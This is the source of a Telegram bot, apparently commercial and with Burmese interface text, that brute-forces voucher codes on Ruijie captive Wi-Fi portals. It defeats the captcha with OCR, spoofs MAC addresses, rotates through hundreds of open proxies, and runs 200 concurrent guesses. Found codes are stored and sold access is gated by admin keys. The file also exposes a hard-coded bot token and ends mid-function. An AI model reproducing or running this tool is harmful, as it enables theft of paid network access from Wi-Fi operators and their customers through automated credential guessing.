import re
import json
import base64
import random
import string
import time
import asyncio
import aiohttp
import sqlite3
import os
import sys
import gc
import itertools
from datetime import datetime, timedelta

# ── SAFE IMPORTS ─────────────────────────────────────────────────────────
try:
    import nest_asyncio
    nest_asyncio.apply()
    print("✅ nest_asyncio loaded")
except ImportError:
    print("⚠️ nest_asyncio မရှိပါ — ကျော်သွားမယ်")

try:
    import cv2
    import ddddocr
    import numpy as np
    _ocr = ddddocr.DdddOcr(show_ad=False)
    OCR_AVAILABLE = True
    print("✅ OCR စနစ် အလုပ်လုပ်နေပါတယ်")
except Exception as e:
    OCR_AVAILABLE = False
    _ocr = None
    cv2 = None
    np = None
    print(f"⚠️ OCR မရနိုင်ပါ: {e}")

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, ContextTypes, CommandHandler,
    CallbackQueryHandler, MessageHandler, filters
)

# ── CONFIGURATION ──────────────────────────────────────────────────────────
MAX_CONCURRENT = 200
CONNECTION_LIMIT = 200
ADMIN_USERNAME = "gobiln07"
ADMIN_URL = f"https://t.me/{ADMIN_USERNAME}"
TOKEN = "8810639279:AAEND0ipOiYNUh9tehwaAZrFLmyKCiDnHEg"
# Proxy List
PROXY_LIST = [
    "socks4://184.170.249.65:4145",
    "socks4://98.170.57.249:4145",
    "socks5://184.178.172.26:4145",
    "socks4://174.64.199.82:4145",
    "socks5://174.77.111.198:49547",
    "http://174.138.165.214:30116",
    "socks5://72.205.0.93:4145",
    "socks4://216.68.128.121:4145",
    "socks5://45.74.31.22:17489",
    "socks5://184.178.172.3:4145",
    "socks5://72.195.34.58:4145",
    "socks5://45.74.31.30:12673",
    "http://131.153.163.125:38393",
    "http://131.153.163.123:36359",
    "socks5://202.181.24.102:10819",
    "socks5://98.175.31.195:4145",
    "socks4://98.188.47.150:4145",
    "socks5://199.66.183.226:4145",
    "socks5://199.58.184.97:4145",
    "http://131.153.163.126:37551",
    "http://98.94.14.234:3762",
    "socks5://184.178.172.17:4145",
    "http://23.251.102.121:80",
    "socks4://192.111.139.163:19404",
    "socks5://199.58.185.9:4145",
    "socks5://184.178.172.23:4145",
    "socks5://192.111.135.17:18302",
    "socks4://192.111.137.34:18765",
    "socks5://67.201.59.70:4145",
    "socks5://45.74.31.30:12918",
    "socks5://199.116.112.6:4145",
    "socks5://72.195.34.60:27391",
    "socks5://98.181.137.83:4145",
    "socks4://184.178.172.14:4145",
    "socks5://192.252.209.155:14455",
    "socks5://45.74.31.30:9627",
    "socks5://45.61.188.134:44499",
    "socks5://184.181.217.213:4145",
    "socks5://192.111.138.29:4145",
    "socks5://192.252.210.233:4145",
    "socks5://204.13.152.7:1080",
    "socks4://47.85.9.228:10800",
    "socks4://98.188.47.132:4145",
    "socks5://72.223.188.67:4145",
    "socks5://45.74.31.47:15326",
    "socks4://184.170.245.148:4145",
    "socks5://199.66.182.232:4145",
    "socks5://131.153.163.123:31648",
    "socks5://184.181.178.33:4145",
    "socks5://45.74.31.25:5148",
    "socks5://43.135.176.121:1080",
    "socks5://216.105.143.146:4145",
    "socks5://45.74.31.25:6725",
    "http://51.17.154.141:9223",
    "http://51.17.154.141:4153",
    "socks5://45.74.31.22:15442",
    "http://131.153.163.126:30181",
    "socks5://174.77.111.196:4145",
    "http://131.153.163.123:20725",
    "socks5://184.182.240.12:4145",
    "http://129.146.191.80:80",
    "socks4://72.207.113.97:4145",
    "socks5://98.170.57.231:4145",
    "http://131.153.163.125:37763",
    "https://131.153.163.126:35179",
    "socks5://209.50.255.91:1080",
    "socks5://174.138.161.189:38300",
    "http://131.153.163.125:33790",
    "socks5://68.71.240.210:4145",
    "https://131.153.163.123:35964",
    "http://131.153.163.86:8949",
    "https://131.153.163.125:30141",
    "http://131.153.163.123:32979",
    "https://18.222.132.180:8824",
    "http://34.220.80.147:999",
    "socks5://174.138.162.37:35977",
    "socks5://45.74.31.22:16089",
    "http://18.60.247.31:43307",
    "socks4://155.138.139.189:32768",
    "socks5://45.74.31.50:8699",
    "socks5://157.151.196.142:1080",
    "socks5://23.95.91.240:49158",
    "http://143.246.138.227:80",
    "http://131.153.163.123:30240",
    "http://131.153.163.126:34556",
    "http://131.153.163.84:9118",
    "http://131.153.163.125:26612",
    "http://131.153.1.46:36489",
    "https://131.153.163.84:39042",
    "http://174.138.162.37:32440",
    "http://131.153.163.84:35898",
    "socks5://212.237.218.43:9050",
    "http://131.153.163.86:30666",
    "http://131.153.163.123:35808",
    "http://131.153.1.46:37221",
    "http://131.153.163.125:29913",
    "http://174.138.162.37:34040",
    "http://131.153.163.86:30120",
    "http://174.138.165.213:37579",
    "http://131.153.1.46:33047",
    "http://131.153.163.84:39003",
    "http://131.153.1.46:30540",
    "https://193.227.129.196:31761",
    "http://131.153.163.84:24688",
    "https://174.138.161.146:32729",
    "http://131.153.163.84:36642",
    "http://107.150.41.226:18080",
    "socks4://107.150.41.226:18080",
    "socks5://107.174.30.94:1080",
    "socks5://129.153.11.56:1080",
    "socks5://174.138.189.26:2001",
    "socks5://83.147.217.103:1080",
    "socks5://107.150.41.226:18080",
    "http://107.167.18.122:443",
    "http://13.59.172.95:3128",
    "socks5://209.50.255.91:1080",
    "socks5://107.167.18.122:443",
    "http://189.51.168.165:999",
    "socks5://38.49.210.79:40000",
    "socks4://107.167.18.122:443",
    "http://184.75.221.82:3118",
    "http://190.0.246.210:4040",
    "http://190.0.246.213:4040",
    "http://213.111.146.36:18080",
    "socks4://213.111.146.36:18080",
    "socks5://213.111.146.36:18080",
    "http://217.76.245.80:999",
    "http://103.119.19.218:3128",
    "https://103.237.102.191:11111",
    "http://172.236.242.244:3128",
    "http://185.195.71.218:18080",
    "socks5://193.25.215.182:22222",
    "http://103.237.102.191:11111",
    "socks5://103.88.234.239:40017",
    "http://190.0.246.211:4040",
    "http://5.129.254.129:8888",
    "http://5.129.254.154:8888",
    "http://5.129.254.5:8888",
    "http://5.129.254.51:8888",
    "socks5://103.88.234.239:40012",
    "socks5://103.88.234.239:40015",
    "socks4://103.88.234.239:40003",
    "http://18.157.123.132:3128",
    "socks5://212.77.75.25:1088",
    "socks5://43.135.176.121:1080",
    "http://5.129.254.49:8888",
    "http://5.129.254.60:8888",
    "socks5://67.207.92.87:1088",
    "socks5://101.36.104.239:10808",
    "socks4://103.88.234.239:40014",
    "socks4://103.88.234.239:40012",
    "socks4://129.151.240.183:1080",
    "http://5.129.254.70:8888",
    "https://95.211.174.135:3128",
    "socks4://103.88.234.239:40008",
    "socks5://129.151.240.183:1080",
    "http://186.5.94.206:999",
    "socks4://8.217.224.41:1081",
    "socks5://103.88.234.239:40008",
    "socks5://109.123.251.109:1080",
    "http://34.43.46.91:80",
    "http://38.51.207.104:8080",
    "socks4://45.61.188.134:44499",
    "socks5://45.61.188.134:44499",
    "http://95.211.174.135:3128",
    "socks5://141.148.206.170:1088",
    "socks5://185.195.71.218:18080",
    "socks4://217.142.236.180:1080",
    "socks5://47.238.126.208:1080",
    "socks5://8.217.224.41:1081",
    "socks5://171.25.158.95:1080",
    "socks4://119.18.147.179:1080",
    "http://136.114.233.244:3128",
    "http://159.223.41.216:9090",
    "socks4://202.5.50.151:1080",
    "socks5://217.142.236.180:1080",
    "socks4://77.238.79.111:5678",
    "socks5://144.24.111.128:1088",
    "socks5://144.91.111.48:1088",
    "socks5://144.91.121.61:1088",
    "http://27.185.218.213:17981",
    "socks5://109.205.182.143:1088",
    "socks5://160.187.0.89:1080",
    "socks4://185.112.83.80:1080",
    "socks5://213.199.47.140:1080",
    "http://129.226.89.151:80",
    "socks4://212.50.19.150:4153",
    "socks5://43.161.246.231:10808",
    "http://43.165.191.196:1082",
    "socks5://101.36.104.46:10808",
    "http://111.200.188.89:8888",
    "http://114.244.214.40:8888",
    "socks4://12.218.209.130:13326",
    "socks4://160.187.0.89:1080",
    "http://31.31.74.185:9898",
    "socks5://45.61.129.165:9050",
    "http://103.88.234.239:40016",
    "socks4://103.9.134.114:1080",
    "http://114.249.225.156:8888",
    "socks4://45.61.129.165:9050",
    "socks5://49.13.22.249:10807",
    "socks5://103.88.234.239:40005",
    "http://103.88.234.239:40008",
    "http://114.246.196.242:8888",
    "http://114.246.200.25:8888",
    "socks5://185.50.202.185:1080",
    "socks5://49.13.22.249:10814",
    "http://103.88.234.239:40014",
    "http://104.248.151.93:9090",
    "http://119.188.131.55:17981",
    "socks5://144.76.61.252:1080",
    "http://152.42.170.187:9090",
    "http://152.42.177.32:8888",
    "socks5://65.20.79.228:40001",
    "http://103.88.234.239:40003",
    "socks4://109.123.251.109:1080",
    "socks5://185.112.83.80:1080",
    "http://193.104.179.115:3128",
    "socks4://144.76.61.252:1080",
    "socks4://181.57.178.146:1080",
    "socks5://23.95.164.244:1081",
    "http://68.183.22.37:10000",
    "socks4://103.87.81.86:5678",
    "http://113.45.195.147:3128",
    "socks4://117.4.26.246:1080",
    "http://123.121.210.208:8888",
    "http://190.12.150.244:999",
    "socks5://65.20.79.228:40000",
    "socks4://88.87.79.18:3629",
    "socks4://103.23.100.9:1080",
    "http://103.88.234.239:40012",
    "http://15.235.145.229:1081",
    "socks4://103.88.234.239:40017",
    "http://111.196.31.158:8888",
    "socks5://113.249.111.67:1080",
    "http://123.113.169.44:8888",
    "http://144.76.61.252:3128",
    "socks5://152.53.183.107:8081",
    "http://190.97.241.106:999",
    "socks4://31.13.239.4:5678",
    "socks5://68.183.22.37:10000",
    "http://90.156.196.230:3128",
    "socks5://103.88.234.239:40016",
    "socks4://105.214.51.182:5678",
    "http://111.196.31.120:8888",
    "http://223.85.21.195:8080",
    "http://43.155.62.157:443",
    "socks5://91.107.179.68:10809",
    "socks4://176.88.166.190:5678",
    "socks4://200.10.31.74:49992",
    "http://3.1.100.245:3128",
    "socks4://95.182.107.210:1080",
    "socks4://68.183.22.37:10000",
    "socks4://76.26.114.253:39593",
    "socks5://43.155.130.224:443",
    "socks5://43.155.143.227:1080",
    "socks4://43.198.26.236:1080",
    "http://47.121.139.13:3128",
    "socks5://49.13.22.249:10803",
    "socks5://79.137.198.71:7777",
    "socks4://83.56.15.57:5678",
    "socks4://152.53.183.107:8081",
    "http://178.16.54.240:44444",
    "http://221.221.154.122:8888",
    "http://24.52.147.103:5999",
    "socks5://45.74.31.50:15728",
    "http://89.105.153.140:3128",
    "socks4://103.53.110.45:10801",
    "socks4://103.88.234.239:40005",
    "socks4://103.88.234.239:40016",
    "socks4://123.231.230.58:31196",
    "http://157.245.70.5:10000",
    "socks4://176.235.182.84:1080",
    "socks4://177.66.43.189:4145",
    "socks4://178.16.54.240:44444",
    "socks4://203.150.113.52:5180",
    "socks4://222.212.85.149:5678",
    "socks5://45.74.31.22:6031",
    "http://103.88.234.239:40005",
    "http://128.199.116.219:9090",
    "http://167.172.76.176:9090",
    "socks4://190.182.137.250:1085",
    "http://205.235.1.34:999",
    "socks4://82.114.181.147:9050",
    "socks4://96.9.88.130:4153",
    "socks5://103.88.234.239:40002",
    "socks4://171.4.85.65:5678",
    "socks4://103.38.183.18:1088",
    "socks4://203.172.120.179:1080",
    "socks5://45.74.31.50:13411",
    "socks4://65.20.79.228:40000",
    "http://78.12.246.160:7475",
    "socks4://96.36.50.99:39593",
    "socks4://103.167.40.54:1080",
    "http://111.230.27.213:3128",
    "http://154.59.56.78:999",
    "http://177.234.221.196:999",
    "socks4://185.132.1.221:4145",
    "socks5://43.198.26.236:1080",
    "http://114.246.203.194:8888",
    "http://123.121.123.216:8888",
    "socks4://160.22.205.66:1080",
    "http://195.144.24.57:3128",
    "socks4://213.149.154.213:5678",
    "http://65.20.79.228:40000",
    "socks5://8.210.127.52:1080",
    "socks4://103.88.234.239:40015",
    "http://111.196.31.46:8888",
    "socks4://113.161.134.128:1080",
    "http://156.240.114.210:3129",
    "socks4://83.220.46.106:4145",
    "socks5://85.209.156.148:1080",
    "http://114.252.12.211:8888",
    "socks5://123.58.219.171:10808",
    "http://154.59.56.73:999",
    "socks4://190.12.95.170:37209",
    "socks4://196.0.113.10:31651",
    "http://205.164.192.115:999",
    "socks4://64.49.67.164:5678",
    "http://114.246.196.248:8888",
    "socks4://116.90.234.106:1080",
    "socks4://117.102.101.52:5678",
    "socks4://160.30.104.170:1080",
    "socks4://188.72.16.74:1080",
    "socks5://45.74.31.47:7035",
    "socks4://65.20.79.228:40001",
    "socks4://103.137.148.253:1080",
    "socks4://103.148.201.74:1089",
    "socks5://178.16.54.240:44444",
    "socks4://186.251.253.53:31337",
    "socks4://200.188.246.122:60606",
    "socks5://223.25.109.146:8199",
    "socks4://43.165.133.188:1081",
    "http://102.214.104.58:8080",
    "http://123.115.226.82:8888",
    "http://38.56.111.104:999",
    "socks5://45.74.31.22:6761",
    "http://65.108.159.129:5153",
    "socks5://8.219.245.123:1080",
    "socks4://93.93.61.153:1080",
    "socks5://95.111.228.190:1082",
    "socks5://138.124.66.226:1080",
    "http://153.51.241.50:999",
    "socks5://157.245.70.5:10000",
    "socks4://196.0.111.186:46048",
    "socks4://36.37.203.215:4153",
    "socks5://45.74.31.42:10465",
    "http://68.183.27.6:10000",
    "socks4://80.78.78.106:65530",
    "socks4://91.247.92.63:5678",
    "socks5://95.111.228.190:1080",
    "socks4://102.215.245.6:4153",
    "socks4://115.127.95.82:1080",
    "socks5://45.74.31.42:7561",
    "socks5://45.74.31.47:7308",
    "socks4://46.214.153.223:5678",
    "socks4://93.118.135.176:1080",
    "http://130.110.103.245:3128",
    "socks4://177.128.81.10:81",
    "socks4://178.48.13.177:80",
    "socks4://187.157.30.202:4153",
    "socks4://31.148.13.96:1080",
    "socks5://45.74.31.42:10424",
    "socks4://176.236.37.132:1080",
    "socks4://179.189.245.173:5432",
    "socks5://45.74.31.42:8924",
    "http://111.192.16.130:8888",
    "socks4://117.198.221.34:4153",
    "http://123.121.122.28:8888",
    "socks5://14.225.204.32:10800",
    "socks4://190.54.100.74:5678",
    "socks4://192.158.15.201:50877",
    "socks5://45.74.31.42:5875",
    "socks4://103.143.214.77:5678",
    "socks4://154.18.220.190:5678",
    "socks5://45.74.31.41:4137",
    "socks5://45.74.31.47:5924",
    "socks4://5.157.64.213:1080",
    "socks4://103.154.76.90:12",
    "http://103.158.210.80:8082",
    "socks4://118.70.211.121:60606",
    "http://123.57.213.24:3539",
    "socks4://95.111.228.190:1082",
    "socks4://102.36.231.77:1080",
    "socks4://14.241.242.177:1080",
    "socks4://187.19.127.180:4153",
    "http://190.235.208.94:8080",
    "socks4://200.105.192.6:5678",
    "http://3.21.247.154:6443",
    "socks5://34.130.43.186:40001",
    "socks5://34.165.243.21:40001",
    "http://38.7.195.51:999",
    "socks5://45.74.31.23:4756",
    "socks5://45.74.31.23:13962",
    "socks5://45.74.31.40:6512",
    "socks5://45.74.31.50:7395",
    "socks5://5.75.133.113:10802",
    "http://122.52.189.109:8080",
    "socks4://160.226.220.30:1080",
    "http://178.92.72.165:8080",
    "socks4://190.13.147.241:5678",
    "socks5://202.53.139.248:1080",
    "http://34.165.243.21:40001",
    "socks5://95.111.228.190:1081",
    "socks4://200.108.50.254:4145",
    "socks4://202.144.134.150:5678",
    "socks5://45.74.31.25:4037",
    "socks5://45.74.31.42:12872",
    "socks5://45.74.31.42:14191",
    "socks4://139.255.94.122:57853",
    "socks4://177.152.106.74:1080",
    "http://186.96.111.214:999",
    "socks4://200.16.211.68:4153",
    "socks4://31.168.143.90:1080",
    "socks5://45.74.31.41:13453",
    "socks5://47.85.13.198:1080",
    "http://85.209.156.148:1080",
    "socks4://89.250.148.158:1080",
    "socks5://138.2.216.186:1080",
    "socks4://160.20.36.109:80",
    "socks4://179.189.243.245:5432",
    "socks5://45.74.31.41:12991",
    "socks5://45.74.31.41:4289",
    "socks5://45.74.31.42:5819",
    "socks5://45.74.31.47:7453",
    "socks4://180.183.149.236:5678",
    "socks4://195.9.146.246:3629",
    "socks5://45.74.31.22:4252",
    "socks5://45.74.31.25:9362",
    "socks5://45.74.31.25:15485",
    "http://49.156.44.114:8080",
    "http://122.246.112.107:7890",
    "socks5://45.74.31.22:10346",
    "socks5://45.74.31.23:14073",
    "socks5://45.74.31.25:7812",
    "socks5://45.74.31.40:6026",
    "socks5://45.74.31.41:4803",
    "socks5://45.74.31.42:4811",
    "socks5://81.0.49.104:18500",
    "socks4://122.252.183.22:4153",
    "socks5://45.74.31.50:5629",
    "socks4://103.41.32.250:51951",
    "socks4://129.205.244.158:1080",
    "socks4://189.202.204.53:1080",
    "socks5://42.112.14.245:1080",
    "socks5://45.74.31.25:7202",
    "socks5://45.74.31.40:16343",
    "socks5://45.74.31.42:13224",
    "socks5://45.74.31.42:8295",
    "socks5://45.74.31.42:7337",
    "socks5://45.74.31.47:10192",
    "socks4://103.66.74.61:1080",
    "socks4://105.214.104.26:5678",
    "socks4://125.25.82.207:5678",
    "http://176.111.37.216:39811",
    "socks4://180.165.19.173:4153",
    "socks4://187.86.153.254:30660",
    "http://31.59.234.26:40001",
    "socks5://45.74.31.23:4969",
    "socks5://45.74.31.47:6099",
    "http://47.107.107.24:80",
    "socks4://74.62.23.242:39593",
    "http://103.123.85.89:8080",
    "socks4://103.156.15.129:12",
    "socks4://103.58.16.106:4145",
    "http://103.88.234.239:40002",
    "http://16.51.53.116:23517",
    "socks5://45.74.31.42:9371",
    "socks4://114.108.177.104:60984",
    "http://114.244.221.178:8888",
    "http://122.52.27.1:8080",
    "socks4://195.140.226.32:5678",
    "socks4://45.162.225.114:59341",
    "socks5://45.74.31.23:10354",
    "socks5://45.74.31.41:4119",
    "socks5://45.74.31.41:4200",
    "socks4://103.25.167.177:4153",
    "socks4://103.83.28.216:5678",
    "socks5://154.201.71.12:2080",
    "socks4://171.242.14.54:1080",
    "socks4://186.190.228.83:4153",
    "http://195.158.8.123:3128",
]
proxy_pool = itertools.cycle(PROXY_LIST) if PROXY_LIST else None

# ── DATABASE SETUP ────────────────────────────────────────────────────────
conn = sqlite3.connect('bot_database.db', check_same_thread=False)
conn.execute('PRAGMA journal_mode=WAL;')
cursor = conn.cursor()
db_lock = asyncio.Lock()

cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (
    user_id INTEGER PRIMARY KEY, session_url TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS found_codes_db (
    user_id INTEGER, code TEXT, plan TEXT, time_val TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS access_codes (
    code TEXT PRIMARY KEY, duration_type TEXT,
    is_used INTEGER DEFAULT 0, used_by INTEGER DEFAULT 0)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS authorized_users (
    user_id INTEGER PRIMARY KEY, duration_type TEXT, expiry_time REAL)''')
conn.commit()


# ── OCR ───────────────────────────────────────────────────────────────────
def _ocr_sync(image_bytes):
    if not OCR_AVAILABLE:
        return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img is None:
            return None
        _, buffer = cv2.imencode('.png', img)
        return _ocr.classification(buffer.tobytes()).upper()
    except Exception:
        return None


# ── HELPERS ───────────────────────────────────────────────────────────────
def is_admin(username: str) -> bool:
    if not username:
        return False
    return username.lower() == ADMIN_USERNAME.lower()


def check_user_auth(user_id: int, username: str) -> bool:
    if is_admin(username):
        return True
    cursor.execute("SELECT expiry_time FROM authorized_users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if row and row[0] > time.time():
        return True
    return False


def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))


def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)


# ── RUIJIE API ────────────────────────────────────────────────────────────
async def get_session_id(session_obj, session_url, prev_sid=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'text/html'
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev_sid
    except Exception:
        return prev_sid


async def Captcha_Image(session_obj, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    try:
        async with session_obj.get(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
            params=params, headers=headers, timeout=5
        ) as req:
            return await req.read()
    except Exception:
        return None


async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)


async def Varify_Captcha(session_obj, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'content-type': 'application/json'
    }
    try:
        async with session_obj.post(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
            headers=headers, json=json_data, timeout=5
        ) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except Exception:
        return None


async def get_balance_info(session_id):
    endpoints = [f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}"]
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'application/json'
    }
    async with aiohttp.ClientSession() as temp_session:
        for url in endpoints:
            try:
                async with temp_session.get(url, headers=headers, timeout=8) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    if not data.get("success", False):
                        continue
                    result = data.get("result", {}) or data.get("data", {})

                    minutes = result.get('totalMinutes') or result.get('remainingMinutes') or result.get('minutes') or 0
                    bytes_val = result.get('totalBytes') or result.get('remainingBytes') or result.get('bytes') or result.get('data') or 0
                    plan_name = result.get("profileName") or result.get("planName") or result.get("name") or "Unknown"

                    if (float(minutes) > 0 or float(bytes_val) > 0
                            or result.get("authorized") is True
                            or result.get("status") == 1):
                        display_info = f"{plan_name}"
                        if float(bytes_val) > 0:
                            gb_val = float(bytes_val) / (1024 * 1024 * 1024)
                            display_info += f" | {gb_val:.2f} GB"
                        elif float(minutes) > 0:
                            display_info += f" | {minutes}m"
                        else:
                            display_info += " | Active"
                        return (display_info, plan_name)
            except Exception:
                continue
    return None


# ── CODE GENERATOR ────────────────────────────────────────────────────────
def code_generator(mode):
    if mode == "6":
        codes = [str(i).zfill(6) for i in range(1000000)]
    elif mode == "7":
        codes = [str(i).zfill(7) for i in range(10000000)]
    elif mode == "8":
        codes = [str(i).zfill(8) for i in range(100000000)]
    elif mode == "9":
        codes = [str(i).zfill(9) for i in range(1000000000)]
    elif mode == "alpha6":
        chars = string.ascii_lowercase
        codes = [''.join(random.choices(chars, k=6)) for _ in range(1000000)]
    elif mode == "mix6":
        chars = string.ascii_lowercase + string.digits
        codes = [''.join(random.choices(chars, k=6)) for _ in range(1000000)]
    else:
        codes = [str(i).zfill(6) for i in range(1000000)]

    random.shuffle(codes)
    for code in codes:
        yield code


# ── CORE CHECK ────────────────────────────────────────────────────────────
async def perform_check_silent(code, chat_obj, session_url, connector, context_data):
    if context_data.get('scan_stop', False):
        return None
    context_data['current_code'] = code
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    session_id = None
    timeout = aiohttp.ClientTimeout(total=10, connect=3)

    for _ in range(2):
        if context_data.get('scan_stop', False):
            return None
        try:
            async with aiohttp.ClientSession(
                connector=connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(), timeout=timeout
            ) as task_session:
                if not session_id:
                    session_id = await get_session_id(task_session, session_url)
                    if not session_id:
                        context_data['expired'] += 1
                        return None

                image = await Captcha_Image(task_session, session_id)
                if not image:
                    context_data['expired'] += 1
                    return None
                text = await Captcha_Text(image)
                if not text or not await Varify_Captcha(task_session, session_id, text):
                    context_data['expired'] += 1
                    return None

                data = {"accessCode": code, "sessionId": session_id,
                        "apiVersion": 1, "authCode": text}
                headers = {
                    "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
                    "content-type": "application/json"
                }
                async with task_session.post(post_url, json=data, headers=headers, timeout=8) as req:
                    response = await req.text()
                    if 'request limited' in response:
                        context_data['retry_total'] += 1
                        await asyncio.sleep(0.5)
                        continue
                    if 'logonUrl' in response or '"success":true' in response:
                        balance_info = await get_balance_info(session_id)
                        if balance_info:
                            balance_display, plan_name = balance_info
                            context_data['success_codes'].append(
                                {"code": code, "plan": plan_name, "balance": balance_display})
                            context_data['hits'] += 1

                            user_id = chat_obj.id
                            async with db_lock:
                                cursor.execute(
                                    "INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)",
                                    (user_id, code, plan_name, balance_display))
                                conn.commit()

                            short_msg = f"🎉 `{code}` | {balance_display}"
                            try:
                                await chat_obj.send_message(short_msg, parse_mode="Markdown")
                            except Exception:
                                pass
                            return True
                    context_data['expired'] += 1
                    return None
        except Exception:
            context_data['expired'] += 1
            return None
    context_data['expired'] += 1
    return None


# ── BACKGROUND SCANNER ────────────────────────────────────────────────────
async def run_scanner_background(query, session_url, mode, total_codes_count, context):
    context.user_data['scan_stop'] = False
    context.user_data['checked_total'] = 0
    context.user_data['hits'] = 0
    context.user_data['expired'] = 0
    context.user_data['retry_total'] = 0
    context.user_data['success_codes'] = []
    context.user_data['current_code'] = "000000"

    start_time = time.time()
    connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, ttl_dns_cache=300)
    code_gen = code_generator(mode)

    try:
        status_msg = await query.message.reply_text(
            f"🚀 စကန်ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
    except Exception:
        status_msg = await query.message.chat.send_message(
            f"🚀 စကန်ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")

    try:
        while not context.user_data.get('scan_stop', False):
            tasks = []
            for _ in range(MAX_CONCURRENT):
                if context.user_data.get('scan_stop', False):
                    break
                try:
                    code = next(code_gen)
                    tasks.append(perform_check_silent(
                        code, query.message.chat, session_url, connector, context.user_data))
                    context.user_data['checked_total'] += 1
                except StopIteration:
                    context.user_data['scan_stop'] = True
                    break
            if not tasks:
                break

            await asyncio.gather(*tasks)
            await asyncio.sleep(0.01)
            if context.user_data.get('scan_stop', False):
                break

            checked_total = context.user_data.get('checked_total', 0)
            hits = context.user_data.get('hits', 0)
            expired = context.user_data.get('expired', 0)
            retry_total = context.user_data.get('retry_total', 0)
            current_code = context.user_data.get('current_code', '000000')

            elapsed_time = time.time() - start_time
            speed_cm = (checked_total / elapsed_time) * 60 if elapsed_time > 0 else 0
            progress_pct = (checked_total / total_codes_count) * 100 if total_codes_count > 0 else 0

            text = (
                f" **Scanner Running** \n"
                f"- Progress: {progress_pct:.2f}%\n"
                f"- Tried: {checked_total:,}/{total_codes_count:,}\n"
                f"- Current Code: `{current_code}`\n"
                f"- Hits: {hits}\n"
                f"- Expired: {expired}\n"
                f"- Limits: {retry_total}\n"
                f"- Speed: {speed_cm:.1f} c/m"
                f"- Proxies: {proxy_status}"
            )
            try:
                await status_msg.edit_text(text, parse_mode="Markdown")
            except Exception:
                pass

    except Exception as e:
        print(e)
    finally:
        try:
            await connector.close()
        except Exception:
            pass
        hits_count = context.user_data.get('hits', 0)
        checked_count = context.user_data.get('checked_total', 0)
        try:
            await query.message.chat.send_message(
                f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ။\n"
                f"စုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
        except Exception:
            pass


# ── MAIN MENU ─────────────────────────────────────────────────────────────
async def show_main_menu(target, user_id, username):
    if is_admin(username):
        async with db_lock:
            cursor.execute(
                "INSERT OR REPLACE INTO authorized_users (user_id, duration_type, expiry_time) VALUES (?, ?, ?)",
                (user_id, "Admin", float('inf')))
            conn.commit()

    buy_text = f"\n\n🛒 **Code ဝယ်ယူရန်:** [Admin @gobiln07 သို့ ဆက်သွယ်ပါ]({ADMIN_URL})"

    if not check_user_auth(user_id, username):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔑 Access Code ထည့်ရန်", callback_data="ask_code")],
            [InlineKeyboardButton("👨‍💻 Admin ဆက်သွယ်ရန်", url=ADMIN_URL)]
        ])
        await target.reply_text(
            f"🔒 **Access Denied**\n\nဤဘော့တ်ကို အသုံးပြုရန် Admin ထံမှ ရရှိထားသော "
            f"Access Code လိုအပ်ပါသည်။ အောက်ပါခလုတ်ကိုနှိပ်ပြီး Code ထည့်သွင်းပါရန်။{buy_text}",
            reply_markup=keyboard, parse_mode="Markdown",
            disable_web_page_preview=True)
        return

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Session URL Setup", callback_data="set_url"),
         InlineKeyboardButton("🚀 Brute Force", callback_data="brute_menu")],
        [InlineKeyboardButton("💎 Saved Codes", callback_data="view_saved_codes"),
         InlineKeyboardButton("👨‍💻 Admin ဆက်သွယ်ရန်", url=ADMIN_URL)]
    ])

    if is_admin(username):
        admin_extra = "\n\n👑 **Admin Commands:**\n- `/gen 30မိနစ်` (သို့) `/gen30မိနစ်` - Key ထုတ်ရန်"
        await target.reply_text(
            f"🚀 **Brute Force Bot (Admin Panel)**\n\nအောက်ပါ Menu မှ ရွေးချယ်ပါ -{admin_extra}{buy_text}",
            reply_markup=keyboard, parse_mode="Markdown",
            disable_web_page_preview=True)
    else:
        await target.reply_text(
            f"🍺 **Ruijie Voucher Bot**\n\nအောက်ပါ Menu မှ ရွေးချယ်ပါ -{buy_text}",
            reply_markup=keyboard, parse_mode="Markdown",
            disable_web_page_preview=True)


# ── TELEGRAM HANDLERS ─────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
